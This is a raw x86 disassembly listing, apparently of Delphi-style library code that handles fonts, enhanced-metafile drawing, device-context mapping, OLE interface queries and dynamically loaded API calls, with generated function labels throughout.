cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_466207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_423ccc
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_4029fc
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_423d44
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_423d70
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_423dd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403234
retn
or bl 0x8
sub_466258
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4663d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404714
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_4663a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a7c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423cb4
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404860
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423d28
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423d64
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423d64
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423d64
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423d64
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423dcc
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_4663e1
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466529
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466530
lea eax [ ebp - 0x2c ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_405a38
lea eax [ ebp - 0x4 ]
call sub_404714
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_423cb4
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404860
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404870
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d28
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_423dcc
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405a38
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_466e88
call sub_464030
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_465f10
sub_46655c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4665ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_405a7c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_465f10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665b2
sub_4665c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_465e84
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_466604
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425f30
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466672
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_4268b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466679
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_46667d
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_466735
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42a47c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42a4b0
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403234
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_426888
call sub_42a700
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_4268a0
call sub_4272d0
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427044
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_466845
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426ca0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426cb8
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426d10
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_466819
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_424568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466820
mov eax [ ebp - 0x18 ]
call sub_403234
retn
mov eax [ ebp - 0x8 ]
call sub_405a38
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_466ea4
call sub_464030
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_465f10
sub_466820
mov eax [ ebp - 0x10 ]
call sub_427e60
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403234
retn
sub_4668a3
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
push ebx
mov ebx eax
mov eax ebx
call sub_465f10
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_4668d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41aa64
pop esi
pop ebx
retn
lea eax [ ebx + 0x28 ]
mov edx [ esi + 0x28 ]
call sub_405a50
pop esi
pop ebx
retn
sub_466910
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4246c4
xor eax eax
push ebp
push sub_466a0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4249b8
mov edi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp [ ebp - 0xc ] 0x4
jne r-xdata
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
mov [ ebp - 0x8 ] eax
push edi
call RealizePalette
mov [ ebp - 0x9 ] 0x1
push esi
mov eax ebx
call sub_466ac0
neg eax
push eax
mov eax ebx
call sub_466adc
push eax
mov eax ebx
call sub_466ac0
dec eax
push eax
push 0x0
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_464030
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
push esi
mov eax [ ebp - 0x10 ]
push eax
push edi
call PlayEnhMetaFile
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4248b0
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
push edi
call SelectPalette
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_466a1c
push ebx
push ecx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov al 0x1
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ebx
retn
sub_466a48
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
push 0x0
call GetDC
mov esi eax
push 0x3
push esi
call SetMapMode
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_466a90
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_466ac0
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_41900c
lea eax [ esp + 0x8 ]
mov edx esp
call sub_466a48
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_466ac0
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_466adc
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_466af8
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_466b14
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_466b34
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_466adc
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_41900c
lea eax [ esp + 0x8 ]
mov edx esp
call sub_466a48
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_466b78
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_466bb6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
call sub_466b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466bbd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_466bc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_464030
sub_466be0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_466c1e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
call sub_466b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c25
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_466c2c
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_405a38
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421220
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_466ecc
call sub_464030
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_466c69
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466ce3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421220
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_464030
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466cea
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub eax 0xffffffec
sub_466cef
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_466d3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
call sub_466b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d46
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_466d4c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_466d8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x4 ]
call sub_466b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d92
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_466d98
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d5f0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_466ea4
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_466ecc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405aac
xor eax eax
push ebp
push sub_466f2b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f32
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_466f3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_466f91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f98
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_467814
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_467852
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_465d7c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467859
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_467860
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4678bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_41357c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a7c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_465dcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4678c4
lea eax [ ebp - 0x8 ]
call sub_405a38
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_4678dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f2ec
mov eax esi
call sub_404e30
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_467920
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_4032e8
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4679e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_467a28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4450cc
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_41a660
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4678fc
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_46809c
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_464030
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_41a660
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_405a38
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_464030
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_41a5b4
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_442ad8
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_426768
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a5b4
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a468
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_468b68
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_464030
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_44960c
push ebx
call sub_469ad8
call sub_464030
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_467c5c
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_403234
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_41a468
call sub_403234
inc edi
dec ebx
jne r-xdata
sub_467c94
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
